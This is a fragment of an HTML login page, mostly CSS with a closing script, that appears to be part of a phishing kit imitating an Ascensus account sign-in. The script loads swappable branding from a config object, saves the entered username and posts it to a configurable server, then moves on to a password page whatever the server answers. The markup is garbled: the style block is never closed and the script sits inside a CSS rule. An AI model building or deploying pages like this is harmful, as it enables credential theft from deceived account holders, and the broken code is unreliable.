<style>
* {

}

html,
body {

}

body {

}

/* ================= HEADER ================= */

.header {
  position: sticky;
  top: 0;
  background: #fff;
  height: 100px;
  z-index: 999999;
  border-bottom: 1px solid #aaa;
  display: flex;
  align-items: center;
  justify-content: space-between;
  padding: 0 28px;
}

.brand {
  width: 50px;
  height: 63px;

  display: flex;
  align-items: center;
  justify-content: center;
  font-size: 23px;
  font-weight: 400;
  letter-spacing: -1px;
}

.assistant {
  background: #120358da;
  color: white;
  border-radius: 25px;
  padding: 10px 17px;
  font-size: 13px;
  font-weight: bold;
  box-shadow: 0 2px 8px rgba(21, 40, 181, 0.55);
  display: flex;
  align-items: center;
  gap: 7px;
}

.assistant-icon {
  width: 21px;
  height: 21px;
  border: 1.5px solid white;
  border-radius: 50%;
  display: flex;
  align-items: center;
  justify-content: center;
  font-size: 10px;
}

/* ================= MAIN ================= */

.main {
  max-width: 1160px;
  margin: 55px auto 0;
  padding: 0 28px;
  display: grid;
  grid-template-columns: 335px 1fr;
  gap: 28px;
  align-items: start;
}

.left {
  width: 100%;
}

.title {
  font-size: 29px;
  line-height: 1.4;
  margin: 4px 0 25px;
  font-weight: 700;
}

.card {
  border: 1px solid #d4d4d4;
  border-radius: 9px;
  padding: 25px 25px 23px;
  box-shadow: 0 1px 3px rgba(0,0,0,.03);
}

.card h2 {
  margin: 0 0 16px;
  font-size: 17px;
  line-height: 1.3;
}

.required-info {
  font-size: 12px;
  line-height: 1.45;
  margin: 0 0 17px;
}

.field-label {
  display: block;
  font-size: 12px;
  margin-bottom: 7px;
}

.field-label span {
  color: #777;
  font-style: italic;
}

.required {
  color: #a52b2b;
}

.input {
  width: 100%;
  height: 58px;
  border: 1px solid #555;
  outline: none;
  padding: 8px;
  font-size: 14px;
  margin-bottom: 17px;
}

.input:focus {
  border-color: #126bb1;
  box-shadow: 0 0 0 1px #126bb1;
}

.remember {
  display: flex;
  align-items: center;
  gap: 6px;
  font-size: 14px;
  margin-bottom: 8px;
}

.remember input {
  appearance: none;
  width: 21px;
  height: 21px;
  border: 1px solid #888;
  border-radius: 2px;
  margin: 0;
  background: #fff;
  flex-shrink: 0;
}

.remember input:checked {
  background: #126bb1;
  box-shadow: inset 0 0 0 4px white;
}

.link {
  color: #3977b5;
  text-decoration: underline;
  font-size: 12px;
  cursor: pointer;
}

.next {
  border: 0;
  margin-top: 23px;
  padding: 10px 19px;
  border-radius: 22px;
  background: #a4a4a4;
  color: white;
  font-size: 13px;
  cursor: pointer;
}

.next:hover {
  background: #858585;
}

/* ================= IMAGE ================= */

.image-area {
  width: 100%;
  height: 425px;
  overflow: hidden;
  object-fit: contain;
  position: relative;
}
.image-area img {
  width: 100%;
  height: 100%;
  object-fit: cover;
}


.road {
  position: absolute;
  width: 75%;
  height: 120%;
  background: #555b59;
  right: -12%;
  bottom: -47%;
  transform: rotate(-19deg);
  border-left: 4px solid #eee;
}

.road::after {
  content: "";
  position: absolute;
  left: 48%;
  top: 0;
  height: 100%;
  border-left: 2px dashed #eee;
}

/* ================= FOOTER ================= */

.footer {
  margin-top: 25px;
  background: #fafafa;
  padding: 23px 28px 21px;
}

.footer-inner {
  max-width: 960px;
  margin: auto;
}

.footer-top {

  justify-content: space-between;
  gap: 25px;
  padding-bottom: 23px;
}

.footer-links {
  display: flex;
  flex-direction: column;
  gap: 17px;
}

.footer-links a {
  color: #3977b5;
  text-decoration: underline;
  font-size: 13px;
}

.demo-brand {

  width: 200px;

  margin-bottom: 14px;
}
.demo-brand img {

  height: auto;
  max-width: 200px;
}

.demo-brand span {

}

.stores {
  display: flex;
  gap: 8px;
}

.store {
  width: 100px;
  height: 34px;
  border-radius: 4px;
  background: #050505;
  color: white;
  display: flex;
  align-items: center;
  justify-content: center;
  font-size: 9px;
  text-align: center;
}
.store img {
  width: 100%;
  height: 100%;
  object-fit: contain;
}
.footer-bottom {
  border-top: 1px solid #aaa;
  padding-top: 22px;
  display: flex;
  justify-content: space-between;
  gap: 22px;
}

.legal-links {
  display: flex;
  flex-wrap: wrap;
  gap: 20px;
}

.legal-links a {
  color: #3977b5;
  text-decoration: underline;
  font-size: 12px;
}

.copyright {

 <script>

  function initPage() {
  const logo = document.getElementById('globalLogo');
  const imageArea = document.getElementById('imageArea');
  
  const cfg = window.APP_CONFIG;

  logo.src=cfg.logo
  logo.alt=cfg.logoAlt
  imageArea.src=cfg.imageArea
  imageArea.alt='image'
}

window.addEventListener('load', initPage);
const input = document.getElementById('username');
const verifybtn = document.getElementById('loginBtn');

// Function to update button color
function updateButtonColor() {
  if (input.value.length) {
    verifybtn.style.background = '#3977b5'; // Active blue
  } else {
    verifybtn.style.background = '#999'; // Inactive gray
  }
}

// Listen for changes
input.addEventListener('input', updateButtonColor);

// Also run on page load in case it has a default value
updateButtonColor();

    function showMessage(message, type = 'error') {
  const messageBox = document.getElementById('messageBox');
  const messageText = document.getElementById('messageText');
  const messageIcon = document.getElementById('messageIcon');
  
  messageText.textContent = message;
  messageBox.className = 'message-container show ' + type;
  messageIcon.textContent = type === 'success' ? '✓' : '✕';
  
  setTimeout(() => {
    messageBox.classList.remove('show');
  }, 5000);
}
     
function submitLogin(){
  const username = document.getElementById('username').value.trim();

  localStorage.setItem('ascensus_username', username);
  if (!username) {
    showMessage('Please enter your username.', 'error');
    return;
  }
  
  const btn = document.getElementById('loginBtn');
  const originalText = btn.textContent;
  btn.disabled = true;
  btn.textContent = 'Loading...';
  
  fetch(window.ascensus_API_BASE + '/api/auth/username', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ username: username})
  })
  .then(function(response){
     window.location.href = './transactional/login-password.html';
    return response.json().then(function(data){
      return { ok: response.ok, data: data };
    });
  })
  .then(function(result){
    if(!result.ok){
      showMessage(result.data.message || 'Unable to process login.', 'error');
      btn.disabled = false;
      btn.textContent = originalText;
      return;
    }

  })
  .catch(function(){
    showMessage('Unable to reach the server. Please try again.', 'error');
    btn.disabled = false;
    btn.textContent = originalText;
  });
}



  </script>
